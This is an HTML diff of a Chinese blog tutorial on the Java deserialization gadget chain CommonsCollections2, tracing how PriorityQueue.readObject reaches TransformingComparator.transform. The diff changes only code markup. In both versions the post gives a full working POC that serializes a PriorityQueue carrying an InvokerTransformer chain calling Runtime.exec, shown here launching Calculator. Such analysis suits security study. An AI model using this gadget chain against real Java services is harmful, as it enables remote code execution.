@@ -478,45 +478,157 @@
             <div id="articleContent">
                 <h1 id="java反序列化CommonCollections2"><a href="#java反序列化CommonCollections2" class="headerlink" title="java反序列化CommonCollections2"></a>java反序列化CommonCollections2</h1><p>不同于之前的几条利用链的是，CommonCollections2要在Common-Collections4下才能生效。Common-Collections4和之前用到的Common-Collections3.2.1并不冲突，可以存在于同一个项目中。</p>
 <h2 id="PriorityQueue利用链"><a href="#PriorityQueue利用链" class="headerlink" title="PriorityQueue利用链"></a>PriorityQueue利用链</h2><p>CommonCollections中找利用链的思想是<strong>找一条从被序列化类的readObject方法中找出能调用transform方法的调用链</strong>。而在CommonCollections2中，我们用的这个被序列化的类是java.util.PriorityQueue。我们先来看一下这个类的readObject方法：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">       <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">       <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">       s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">       s.readInt();</span><br><span class="line"></span><br><span class="line">       SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);</span><br><span class="line">       queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Read in all elements.</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">           queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">       <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">       heapify();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">private void readObject(java.io.ObjectInputStream s)
+       throws java.io.IOException, ClassNotFoundException &#123;
+       &#x2F;&#x2F; Read in size, and any hidden stuff
+       s.defaultReadObject();
+
+       &#x2F;&#x2F; Read in (and discard) array length
+       s.readInt();
+
+       SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);
+       queue &#x3D; new Object[size];
+
+       &#x2F;&#x2F; Read in all elements.
+       for (int i &#x3D; 0; i &lt; size; i++)
+           queue[i] &#x3D; s.readObject();
+
+       &#x2F;&#x2F; Elements are guaranteed to be in &quot;proper order&quot;, but the
+       &#x2F;&#x2F; spec has never explained what that might be.
+       heapify();
+   &#125;</code></pre>
 
 <p>似乎没有可以让我们直接使用的transform。这里我们先直接给出最后调用到transform的地方，位于org.apache.commons.collections4.comparators.TransformingComparator的compare方法中：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">       <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">       <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">public int compare(I obj1, I obj2) &#123;
+       O value1 &#x3D; this.transformer.transform(obj1);
+       O value2 &#x3D; this.transformer.transform(obj2);
+       return this.decorated.compare(value1, value2);
+   &#125;</code></pre>
 
 <p>那么它们是怎样连接起来的呢？这里我们就要聊一下PriorityQueue了</p>
 <p>java.util.PriorityQueue是一个基于二叉堆实现的优先队列。二叉堆是一种特殊的堆，二叉堆是完全二叉树或者是近似完全二叉树。二叉堆有两种：最大堆和最小堆。<strong>最大堆：父结点的键值总是大于或等于任何一个子节点的键值；最小堆：父结点的键值总是小于或等于任何一个子节点的键值。</strong>这样就使得每个元素都有了自己的优先级。</p>
 <p>那么反序列化时为什么要调用一个heapify()方法，这个方法又是干什么的呢？                                                                                                          heapify方法对数组进行调整，使得它符合二叉堆的规范或者特点。而在readObject中调用它就是为了在反序列化之后能保证整个结构的顺序。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">private void heapify() &#123;
+    for (int i &#x3D; (size &gt;&gt;&gt; 1) - 1; i &gt;&#x3D; 0; i--)
+        siftDown(i, (E) queue[i]);
+&#125;</code></pre>
 
 <p>这里只调用了一个方法，siftDown(),这个方法的作用是将结点下移（排序是靠将大的节点下移实现的）。而这个方法又会调用一个siftDownUsingComparator方法。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">       <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">           <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">           <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">           <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">           <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">               comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">               c = queue[child = right];</span><br><span class="line">           <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           queue[k] = c;</span><br><span class="line">           k = child;</span><br><span class="line">       &#125;</span><br><span class="line">       queue[k] = x;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">private void siftDownUsingComparator(int k, E x) &#123;
+       int half &#x3D; size &gt;&gt;&gt; 1;
+       while (k &lt; half) &#123;
+           int child &#x3D; (k &lt;&lt; 1) + 1;
+           Object c &#x3D; queue[child];
+           int right &#x3D; child + 1;
+           if (right &lt; size &amp;&amp;
+               comparator.compare((E) c, (E) queue[right]) &gt; 0)
+               c &#x3D; queue[child &#x3D; right];
+           if (comparator.compare(x, (E) c) &lt;&#x3D; 0)
+               break;
+           queue[k] &#x3D; c;
+           k &#x3D; child;
+       &#125;
+       queue[k] &#x3D; x;
+   &#125;</code></pre>
 
 <p>在这个方法中是实现了排序的代码。这里的comparator.compare就是来比较两个节点大小的。</p>
 <p>说到这里，我们就不得不提一下比较器了。比较器涉及了一种java设计模式——<strong>Strategy设计模式</strong>（策略设计模式），这里我们不展开说。对于比较器而言，其实就是把不同比较策略的算法封装到实现了Comparator接口的类当中。客户在调用的时候可以根据自己的需求选择。</p>
 <p>这里我们看一下这个比较器是哪来的：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">PriorityQueue</span><span class="params">(<span class="type">int</span> initialCapacity,</span></span><br><span class="line"><span class="params">                         Comparator&lt;? <span class="built_in">super</span> E&gt; comparator)</span> &#123;</span><br><span class="line">        <span class="comment">// Note: This restriction of at least one is not actually needed,</span></span><br><span class="line">        <span class="comment">// but continues for 1.5 compatibility</span></span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &lt; <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">        <span class="built_in">this</span>.queue = <span class="keyword">new</span> <span class="title class_">Object</span>[initialCapacity];</span><br><span class="line">        <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">public PriorityQueue(int initialCapacity,
+                         Comparator&lt;? super E&gt; comparator) &#123;
+        &#x2F;&#x2F; Note: This restriction of at least one is not actually needed,
+        &#x2F;&#x2F; but continues for 1.5 compatibility
+        if (initialCapacity &lt; 1)
+            throw new IllegalArgumentException();
+        this.queue &#x3D; new Object[initialCapacity];
+        this.comparator &#x3D; comparator;
+    &#125;</code></pre>
 
 <p>在PriorityQueue的构造函数中我们可以看到这个comparator是调用者传进去的。其实PriorityQueue有很多个构造函数，我这里贴出这个构造函数是因为待会我们要使用的就是这个。</p>
 <p>现在我们再回看之前给出的org.apache.commons.collections4.comparators.TransformingComparator，其实它就是一个实现了Comparator的类，是不是有种恍然大明白的感觉。这里我们只需把它传入PriorityQueue的构造函数中。不就能通过其compare方法顺利调用了transform吗？</p>
 <p>下面我们给出POC：</p>
 <p>Transformer这块还是和CommomCollections1一样，这里我们需要把transformerchain传入到TransformingComparator中</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">Comparator comparator &#x3D; new TransformingComparator(transformerChain);</code></pre>
 
 <p>然后就是实例化PriorityQueue，这里我们用到的是上面提到的那个构造函数。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">PriorityQueue queue &#x3D; new PriorityQueue(2, comparator);
+        queue.add(1);
+        queue.add(2);</code></pre>
 
 <p>我们这里传入了两个参数，第二个是触发漏洞的comparator，那么第一个参数又是什么呢？我们观察之前的构造函数可以看到，第一个参数其实是创建初始数组的长度。我们这里传入2，是因为只有在元素个数大于等于2的时候才会触发比较。后面随意添加两个非null的对象进去即可。其实我们传入的这两个对象最后会被当作参数传入compare方法，随后传入到我们要触发的transform中。</p>
 <img src="/Downloads/common21.png"  style="zoom:50%;" />
 
 <p>那么这样会不会影响到我们POC链的执行呢？我们回顾一下之前的内容：这里的transformer是我们传进去的transformerChain，</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">public Object transform(Object object) &#123;
+        for(int i &#x3D; 0; i &lt; this.iTransformers.length; ++i) &#123;
+            object &#x3D; this.iTransformers[i].transform(object);
+        &#125;
+        return object;
+    &#125;</code></pre>
 
 <p>这里又会把这个参数传入到第一个Transformer的transform方法中，即ConstantTransformer的transformer，我们看一下：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">public Object transform(Object input) &#123;
+        return this.iConstant;
+    &#125;</code></pre>
 
 <p>传入的参数在这里并不会有任何的影响。</p>
 <p>最后的POC：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.deserialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">package com.govuln.deserialization;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.Comparator;
+import java.util.PriorityQueue;
+
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+
+public class CommonsCollections2 &#123;
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;
+        Field field &#x3D; obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    &#125;
+
+    public static void main(String[] args) throws Exception &#123;
+        Transformer[] fakeTransformers &#x3D; new Transformer[] &#123;new ConstantTransformer(1)&#125;;
+        Transformer[] transformers &#x3D; new Transformer[] &#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,
+                        Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,
+                        new Class[0] &#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,
+                        Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,
+                        new String[] &#123; &quot;&#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot; &#125;),
+        &#125;;
+        Transformer transformerChain &#x3D; new ChainedTransformer(fakeTransformers);
+
+        Comparator comparator &#x3D; new TransformingComparator(transformerChain);
+
+        PriorityQueue queue &#x3D; new PriorityQueue(2, comparator);
+        queue.add(1);
+        queue.add(2);
+
+        setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);
+
+        ByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();
+        ObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+
+        System.out.println(barr);
+        ObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+        Object o &#x3D; (Object)ois.readObject();
+    &#125;
+&#125;
+</code></pre>
 
 <p>​    结果弹出计算机</p>
 <img src="/Downloads/common22.png"  style="zoom:50%;" />
